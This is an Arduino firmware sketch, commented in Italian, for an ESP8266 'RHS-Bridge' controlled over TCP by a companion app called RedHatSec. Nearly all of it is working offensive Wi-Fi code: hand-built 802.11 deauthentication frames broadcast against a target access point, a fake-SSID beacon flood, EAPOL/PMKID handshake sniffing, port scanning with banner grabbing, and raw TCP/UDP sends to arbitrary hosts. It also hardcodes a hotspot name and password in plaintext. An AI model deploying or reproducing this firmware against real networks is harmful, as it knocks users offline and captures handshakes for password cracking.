/*
 * RHSBridge.ino — bridge radio ESP8266 per RedHatSec
 *
 * Comanda da app: TCP :3333 (AP "RHS-Bridge" / pass "rhsbridge" — 192.168.4.1)
 * o via mDNS _rhsbridge._tcp se l'ESP entra nella rete del telefono (cmd 0x08).
 *
 * Protocollo framed BYTE-EXACT con RedHatSec/Sources/Core/Bridge.swift:
 *   TX (app→ESP): [0xA5][len LE u16][seq u8][cmd u8][payload][crc8]
 *   RX (ESP→app): [0x5A][len LE u16][cmdEcho u8][status u8][payload][crc8]
 *   crc8: poly 0x07, init 0x00, MSB-first, su [lenL lenH echo/seq cmd status]+payload
 *
 * Comandi:
 *   0x01 ping
 *   0x02 wifiScan [sec]            → frame async echo 0x02: nets
 *   0x03 wifiResults               → nets ora
 *   0x04 deauth [bssid6][ch][cnt]  → burst reason-7 (frame injection)
 *   0x05 beaconSpam [n][len ssid]… → beacon flood continuo fino a 0x07
 *   0x06 pmkid [bssid6][ch]        → sniff EAPOL (M1) su quel canale, ≤25s
 *   0x07 stop
 *   0x08 joinTarget [lenS][ssid][lenP][pass] → reply: IP come stringa
 *   0x10 portScan [ip4][n][port u16 LE ×n]   → [port u16 LE][bl][banner]…
 *   0x11 roundTrip TCP [ip4][port u16 LE][t×100ms][len u16][payload] → risposta
 *   0x12 roundTrip UDP identico
 *
 * Net payload: [rssi i8][ch u8][bssid 6][sec u8 (0=OPEN,1=WPA…)][ssidLen u8][ssid…]
 *
 * NOTA radio (single-radio ESP8266): softAP si sposta sul canale target con
 * WiFi.softAP(ssid,pass,ch) — il telefono segue il cambio canale e il TCP
 * sopravvive; poi promiscuous+burst in AP_STA. La lib Arduino espone
 * wifi_send_pkt_freedom via SDK (dichiarate qui extern "C").
 *
 * Flash: Arduino IDE → board "Generic ESP8266 Module" (o NodeMCU 1.0), 80MHz,
 * Flash size 4MB, upload via esptool/USB. Monitor 115200 per i log.
 */

#include <ESP8266WiFi.h>
#include <ESP8266mDNS.h>

// SDK symbols già dichiarati in user_interface.h (core 3.x li espone via ESP8266WiFi.h);
// include esplicito + silenzio del deprecation warning
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
#include "user_interface.h"
#pragma GCC diagnostic pop

#define BRIDGE_PORT 3333
#define AP_SSID     "RHS-Bridge"
#define AP_PASS     "rhsbridge"
// hotspot del telefono: il bridge principale è QUI (STA), l'AP resta come fallback
#define PH_SSID     "Hexxeted"
#define PH_PASS     "lwae9180"
#define MAX_NETS    14
#define MAX_SSIDS   16

WiFiServer server(BRIDGE_PORT);
WiFiClient client;

// ============ framing ============

static uint8_t crc8(const uint8_t* d, size_t n) {
  uint8_t c = 0;
  while (n--) {
    c ^= *d++;
    for (uint8_t i = 0; i < 8; i++) c = (c & 0x80) ? (uint8_t)((c << 1) ^ 0x07) : (uint8_t)(c << 1);
  }
  return c;
}

// reply verso l'app (echo = cmd id richiesto)
static void reply(uint8_t echo, uint8_t status, const uint8_t* payload, uint16_t plen) {
  if (!client || !client.connected()) return;
  uint8_t hdr[5] = { 0x5A, (uint8_t)(plen & 0xFF), (uint8_t)(plen >> 8), echo, status };
  client.write(hdr, 5);
  if (plen) client.write(payload, plen);
  static uint8_t body[4 + 640];
  body[0] = hdr[1]; body[1] = hdr[2]; body[2] = echo; body[3] = status;
  if (plen) memcpy(body + 4, payload, plen);
  client.write(crc8(body, (size_t)(4 + plen)));
}

// ============ stato ============

enum State : uint8_t { IDLE, SCANNING, DEAUTHING, SPAMMING, SNIFFING, PORTSCANNING, ROUNDTRIP, JOINING };
State state = IDLE;

uint8_t  scanSecs = 8;
uint32_t scanT0 = 0;

char     spamSsids[MAX_SSIDS][33];
uint8_t  spamLens[MAX_SSIDS];
uint8_t  spamCount = 0;
uint8_t  spamIdx = 0;
uint32_t lastBeacon = 0;

uint8_t  deauthMac[6];
uint8_t  deauthCh = 1;
uint8_t  deauthLeft = 0;
uint32_t lastDeauth = 0;
uint8_t  deauthSeqEcho = 0x04;

uint8_t  sniffMac[6];
uint32_t sniffT0 = 0;
bool     eapolSeen = false;

uint8_t  rxBuf[1200];
uint16_t rxLen = 0;

// ============ radio helper ============

static void apOnChannel(uint8_t ch) {
  // riporta l'AP sul canale target (il telefono segue, il TCP sopravvive)
  if (WiFi.channel() != ch) {
    WiFi.softAP(AP_SSID, AP_PASS, ch);
    delay(300);
  }
}

static void sendDeauthBurst(const uint8_t* bssid, uint8_t ch, uint8_t count) {
  apOnChannel(ch);
  wifi_promiscuous_enable(true);
  wifi_set_channel(ch);
  uint8_t f[26] = {
    0xC0, 0x00,              // fc: mgmt, deauth
    0x00, 0x00,              // duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA broadcast (squalifica tutto il BSS)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA = BSSID
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
    0x00, 0x00,              // seq/frag
    0x07, 0x00               // reason 7 (classe 3 fuori dal BSS)
  };
  memcpy(f + 10, bssid, 6);
  memcpy(f + 16, bssid, 6);
  for (uint8_t i = 0; i < count; i++) {
    f[22] = (uint8_t)(i << 4);   // seq progressivo
    wifi_send_pkt_freedom(f, 26, 0);
    delay(6);
  }
  wifi_promiscuous_enable(false);
}

static void sendBeacon(const char* ssid, uint8_t ssidLen) {
  uint8_t f[128];
  memset(f, 0, sizeof(f));
  // header mgmt 24B: fc(2) dur(2) DA(6) SA(6) BSSID(6) seq(2)
  f[0] = 0x80; f[1] = 0x00;                       // beacon
  for (int i = 4; i < 10; i++) f[i] = 0xFF;       // DA broadcast
  uint8_t rnd[6];
  for (int i = 0; i < 6; i++) rnd[i] = (uint8_t)(random(256) | 0x02);
  memcpy(f + 10, rnd, 6);                         // SA random locale
  memcpy(f + 16, rnd, 6);                         // BSSID = SA
  // timestamp 24..31 (zero), interval 32..33 = 100 TU, capability 34..35
  f[32] = 0x64; f[33] = 0x00;
  f[34] = 0x11; f[35] = 0x04;                     // ESS + privacy
  uint8_t o = 36;
  f[o++] = 0x00; f[o++] = ssidLen;                // SSID element
  memcpy(f + o, ssid, ssidLen); o += ssidLen;
  f[o++] = 0x01; f[o++] = 0x01; f[o++] = 0x82;    // rates
  f[o++] = 0x03; f[o++] = 0x01; f[o++] = (uint8_t)WiFi.channel(); // DS param
  wifi_send_pkt_freedom(f, o, 0);
}

// sniffer EAPOL: cerca LLC/SNAP 88-8E nel frame raw (offset-tolerant)
static void sniffer(uint8_t* buf, uint16_t len) {
  if (state != SNIFFING || eapolSeen) return;
  if (len < 40) return;
  for (uint16_t i = 24; i + 8 <= len && i < 64; i++) {
    if (buf[i] == 0xAA && buf[i+1] == 0xAA && buf[i+2] == 0x03 &&
        buf[i+3] == 0x00 && buf[i+4] == 0x00 && buf[i+5] == 0x00 &&
        buf[i+6] == 0x88 && buf[i+7] == 0x8E) {
      eapolSeen = true;
      return;
    }
  }
  (void)sniffMac;
}

// ============ handlers ============

static void sendNets(uint8_t echo) {
  int n = WiFi.scanComplete();
  if (n < 0) { reply(echo, 1, nullptr, 0); return; }
  static uint8_t out[640];
  uint16_t o = 0;
  int nets = n < MAX_NETS ? n : MAX_NETS;
  for (int i = 0; i < nets && o < 600; i++) {
    String ssid = WiFi.SSID(i);
    if (ssid.length() > 32) ssid = ssid.substring(0, 32);
    int8_t rssi = (int8_t)WiFi.RSSI(i);
    uint8_t ch = WiFi.channel(i);
    uint8_t sec = (WiFi.encryptionType(i) == ENC_TYPE_NONE) ? 0 : 1;
    out[o++] = (uint8_t)rssi;
    out[o++] = ch;
    memcpy(out + o, WiFi.BSSID(i), 6); o += 6;
    out[o++] = sec;
    out[o++] = (uint8_t)ssid.length();
    memcpy(out + o, ssid.c_str(), ssid.length()); o += (uint16_t)ssid.length();
  }
  reply(echo, 0, out, o);
}

static void doJoin(uint8_t* p, uint16_t plen) {
  if (plen < 2) { reply(0x08, 1, nullptr, 0); return; }
  uint8_t sl = p[0];
  if (2 + sl > plen) { reply(0x08, 1, nullptr, 0); return; }
  char ssid[33]; memcpy(ssid, p + 1, sl); ssid[sl] = 0;
  uint8_t off = 1 + sl;
  uint8_t pk = p[off];
  if (off + 1 + pk > plen) { reply(0x08, 1, nullptr, 0); return; }
  char pass[65]; memcpy(pass, p + off + 1, pk); pass[pk] = 0;
  WiFi.begin(ssid, (pk ? pass : nullptr), 0, nullptr, true); // AP+STA
  uint32_t t0 = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - t0 < 18000) { delay(200); }
  if (WiFi.status() == WL_CONNECTED) {
    String ip = WiFi.localIP().toString();
    reply(0x08, 0, (const uint8_t*)ip.c_str(), (uint16_t)ip.length());
    MDNS.begin("rhsbridge");
    MDNS.addService("rhsbridge", "tcp", BRIDGE_PORT);
  } else {
    reply(0x08, 1, nullptr, 0);
  }
}

static void doPortScan(uint8_t* p, uint16_t plen) {
  if (plen < 5) { reply(0x10, 1, nullptr, 0); return; }
  uint32_t ip = (uint32_t)p[0] | ((uint32_t)p[1] << 8) | ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
  uint8_t n = p[4];
  if (plen < (uint16_t)(5 + n * 2)) { reply(0x10, 1, nullptr, 0); return; }
  static uint8_t out[512];
  uint16_t o = 0;
  IPAddress tgt(ip);
  for (uint8_t i = 0; i < n && o < 500; i++) {
    uint16_t port = (uint16_t)p[5 + i * 2] | ((uint16_t)p[6 + i * 2] << 8);
    WiFiClient c;
    c.setTimeout(150);
    if (c.connect(tgt, port)) {
      delay(120);
      int av = c.available();
      if (av > 100) av = 100;
      uint8_t banner[100];
      int got = c.readBytes(banner, av);
      c.stop();
      out[o++] = (uint8_t)(port & 0xFF); out[o++] = (uint8_t)(port >> 8);
      out[o++] = (uint8_t)got;
      memcpy(out + o, banner, got); o += (uint16_t)got;
    }
  }
  reply(0x10, 0, out, o);
}

static void doRoundTrip(uint8_t* p, uint16_t plen, bool udp) {
  if (plen < 9) { reply(udp ? 0x12 : 0x11, 1, nullptr, 0); return; }
  uint32_t ip = (uint32_t)p[0] | ((uint32_t)p[1] << 8) | ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
  uint16_t port = (uint16_t)p[4] | ((uint16_t)p[5] << 8);
  uint16_t tms = (uint16_t)p[6] * 100;
  uint16_t len = (uint16_t)p[7] | ((uint16_t)p[8] << 8);
  if (plen < (uint16_t)(9 + len)) { reply(udp ? 0x12 : 0x11, 1, nullptr, 0); return; }
  IPAddress tgt(ip);
  static uint8_t out[512];
  uint16_t got = 0;
  if (udp) {
    WiFiUDP u;
    u.beginPacket(tgt, port);
    u.write(p + 9, len);
    u.endPacket();
    uint32_t t0 = millis();
    while (millis() - t0 < tms && got == 0) {
      int pk = u.parsePacket();
      if (pk > 0) {
        if (pk > 500) pk = 500;
        got = (uint16_t)u.read(out, pk);
        break;
      }
      delay(10);
    }
  } else {
    WiFiClient c;
    c.setTimeout(tms);
    if (!c.connect(tgt, port)) { reply(0x11, 2, nullptr, 0); return; }
    c.write(p + 9, len);
    uint32_t t0 = millis();
    while (millis() - t0 < tms && got == 0) {
      int av = c.available();
      if (av > 0) {
        if (av > 500) av = 500;
        got = (uint16_t)c.readBytes(out, av);
        break;
      }
      delay(10);
    }
    c.stop();
  }
  reply(udp ? 0x12 : 0x11, 0, out, got);
}

static void dispatch(uint8_t cmd, uint8_t* p, uint16_t plen, uint8_t seqIn) {
  (void)seqIn;
  switch (cmd) {
    case 0x01: // ping
      reply(0x01, 0, p, plen);
      break;
    case 0x02: // wifiScan async
      scanSecs = plen ? p[0] : 8;
      WiFi.scanNetworks(true /*async*/, true /*show hidden*/);
      state = SCANNING;
      scanT0 = millis();
      break;
    case 0x03: // wifiResults subito
      sendNets(0x03);
      break;
    case 0x04: // deauth
      if (plen < 8) { reply(0x04, 1, nullptr, 0); break; }
      memcpy(deauthMac, p, 6);
      deauthCh = p[6];
      deauthLeft = p[7];
      sendDeauthBurst(deauthMac, deauthCh, deauthLeft);
      reply(0x04, 0, nullptr, 0);
      break;
    case 0x05: // beaconSpam
      if (plen < 1) { reply(0x05, 1, nullptr, 0); break; }
      spamCount = p[0];
      if (plen < (uint16_t)(1 + spamCount)) { reply(0x05, 1, nullptr, 0); break; }
      {
        uint16_t o = 1;
        for (uint8_t i = 0; i < spamCount && i < MAX_SSIDS; i++) {
          uint8_t l = p[o++];
          if (o + l > plen) { reply(0x05, 1, nullptr, 0); return; }
          memcpy(spamSsids[i], p + o, l); spamSsids[i][l] = 0;
          spamLens[i] = l;
          o += l;
        }
      }
      state = SPAMMING;
      reply(0x05, 0, nullptr, 0);
      break;
    case 0x06: { // pmkid: sniff EAPOL su canale, ≤25s
      if (plen < 7) { reply(0x06, 1, nullptr, 0); break; }
      memcpy(sniffMac, p, 6);
      apOnChannel(p[6]);
      wifi_promiscuous_enable(true);
      wifi_set_channel(p[6]);
      wifi_promiscuous_enable(false);
      wifi_promiscuous_enable(true);
      wifi_set_promiscuous_rx_cb(sniffer);
      eapolSeen = false;
      state = SNIFFING;
      sniffT0 = millis();
      break;
    }
    case 0x07: // stop
      state = IDLE;
      spamCount = 0;
      wifi_promiscuous_enable(false);
      wifi_set_promiscuous_rx_cb(nullptr);
      reply(0x07, 0, nullptr, 0);
      break;
    case 0x08: doJoin(p, plen); break;
    case 0x10: doPortScan(p, plen); break;
    case 0x11: doRoundTrip(p, plen, false); break;
    case 0x12: doRoundTrip(p, plen, true); break;
    default:
      reply(cmd, 1, nullptr, 0);
  }
}

// ============ RX parsing ============

static void feed(uint8_t* b, size_t n) {
  while (n--) {
    uint8_t c = *b++;
    if (rxLen == 0 && c != 0xA5) { Serial.write(c); continue; }  // passthrough UART
    if (rxLen < sizeof(rxBuf)) rxBuf[rxLen++] = c;
    if (rxLen < 5) continue;
    uint16_t plen = (uint16_t)rxBuf[1] | ((uint16_t)rxBuf[2] << 8);
    uint16_t need = (uint16_t)(5 + plen + 1);
    if (rxLen < need) continue;
    uint8_t crc = rxBuf[need - 1];
    uint8_t calc = crc8(rxBuf + 1, (size_t)(4 + plen));
    rxLen = 0;
    if (crc != calc) { Serial.println("[rhs] crc err"); continue; }
    uint8_t seq = rxBuf[3];
    uint8_t cmd = rxBuf[4];
    dispatch(cmd, rxBuf + 5, plen, seq);
  }
}

// ============ setup/loop ============

// LED di stato (GPIO2 onboard, attivo LOW)
#define LED_PIN 2
#define LED_ON()  digitalWrite(LED_PIN, LOW)
#define LED_OFF() digitalWrite(LED_PIN, HIGH)

void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);
  // boot: 3 blink rapidi
  for (int i = 0; i < 3; i++) { LED_ON(); delay(90); LED_OFF(); delay(90); }
  WiFi.mode(WIFI_AP_STA);
  // ponte principale: l'ESP entra nell'hotspot del telefono (stessa rete → TCP diretto)
  WiFi.setAutoReconnect(true);
  WiFi.begin(PH_SSID, PH_PASS, 0, nullptr, true);
  // fallback: AP proprio (se l'hotspot manca, il telefono si aggancia qui)
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
  WiFi.softAP(AP_SSID, AP_PASS);
  WiFi.scanNetworks(true);
  server.begin();
  server.setNoDelay(true);
  Serial.println("[rhs] bridge :3333 — hotspot " PH_SSID " + AP fallback");
}

void loop() {
  server.hasClient();  // flush closed sockets internally
  if (!client || !client.connected()) {
    if (server.hasClient()) {
      if (client) client.stop();
      client = server.available();
      client.setNoDelay(true);
      rxLen = 0;
      Serial.println("[rhs] client connesso");
    }
  } else if (server.hasClient()) {
    // un solo client: rifiuta gli extra
    WiFiClient junk = server.available();
    junk.stop();
  }

  // RX verso parser
  if (client && client.connected()) {
    int av = client.available();
    if (av > 0) {
      if (av > 256) av = 256;
      uint8_t tmp[256];
      int got = client.readBytes(tmp, av);
      feed(tmp, (size_t)got);
    }
  }

  // retry hotspot ogni 30s se disconnesso
  static uint32_t lastJoinTry = 0;
  if (WiFi.status() != WL_CONNECTED && millis() - lastJoinTry > 30000) {
    lastJoinTry = millis();
    WiFi.begin(PH_SSID, PH_PASS, 0, nullptr, true);
    Serial.println("[rhs] retry hotspot");
  }

  // debug: a 60s senza hotspot, stampo lo scan (cerco l'SSID del telefono)
  static bool debugScanDone = false;
  if (!debugScanDone && millis() > 60000 && WiFi.status() != WL_CONNECTED) {
    debugScanDone = true;
    int n = WiFi.scanComplete();
    if (n < 0) { Serial.println("[rhs] DEBUG scan: non ancora pronto"); n = 0; }
    Serial.print("[rhs] DEBUG scan: "); Serial.print(n); Serial.println(" reti");
    for (int i = 0; i < n; i++) {
      bool hit = WiFi.SSID(i) == PH_SSID;
      Serial.print(hit ? "[rhs] >>> TROVATA: " : "[rhs]   - ");
      Serial.print(WiFi.SSID(i));
      Serial.print(" ch"); Serial.print(WiFi.channel(i));
      Serial.print(" rssi "); Serial.print(WiFi.RSSI(i));
      Serial.print(" enc "); Serial.println((int)WiFi.encryptionType(i));
    }
    if (n == 0) Serial.println("[rhs] nessuna rete vista — hotspot OFF o 5GHz? attiva \"Massimizza compatibilita\"");
  }

  // LED di stato
  static uint32_t lastLedT = 0;
  static bool ledPhase = false;
  uint32_t now = millis();
  if (client && client.connected()) {
    LED_ON();                                        // ON fisso: ponte pronto
  } else if (WiFi.status() == WL_CONNECTED) {
    if (now - lastLedT > 2000) { lastLedT = now; ledPhase = true; LED_ON(); }
    else if (now - lastLedT > 1800) LED_OFF();       // flash breve ogni 2s: hotspot ok, in attesa
  } else {
    if (now - lastLedT > 600) { lastLedT = now; ledPhase = !ledPhase; }
    digitalWrite(LED_PIN, ledPhase ? LOW : HIGH);    // blink 1Hz: cerco l'hotspot
  }

  MDNS.update();

  // mDNS quando l'hotspot è raggiunto (le app lo scoprono via _rhsbridge._tcp)
  static bool mdnsUp = false;
  if (!mdnsUp && WiFi.status() == WL_CONNECTED) {
    if (MDNS.begin("rhsbridge")) {
      MDNS.addService("rhsbridge", "tcp", BRIDGE_PORT);
      mdnsUp = true;
      Serial.print("[rhs] hotspot OK, IP: ");
      Serial.println(WiFi.localIP());
    }
  } else if (mdnsUp && WiFi.status() != WL_CONNECTED) {
    mdnsUp = false;
  }

  // scan async completa
  if (state == SCANNING && WiFi.scanComplete() >= 0) {
    state = IDLE;
    sendNets(0x02);
  } else if (state == SCANNING && millis() - scanT0 > (uint32_t)(scanSecs + 10) * 1000UL) {
    state = IDLE;
    reply(0x02, 1, nullptr, 0);
  }

  // beacon spam round-robin (canale corrente: single-radio)
  if (state == SPAMMING && spamCount && millis() - lastBeacon > 40) {
    lastBeacon = millis();
    sendBeacon(spamSsids[spamIdx], spamLens[spamIdx]);
    spamIdx = (spamIdx + 1) % spamCount;
  }

  // pmkid: fine timeout
  if (state == SNIFFING && millis() - sniffT0 > 25000) {
    wifi_promiscuous_enable(false);
    wifi_set_promiscuous_rx_cb(nullptr);
    state = IDLE;
    reply(0x06, eapolSeen ? 0 : 1, nullptr, 0);
  } else if (state == SNIFFING && eapolSeen) {
    wifi_promiscuous_enable(false);
    wifi_set_promiscuous_rx_cb(nullptr);
    state = IDLE;
    reply(0x06, 0, nullptr, 0);
  }

  yield();
}
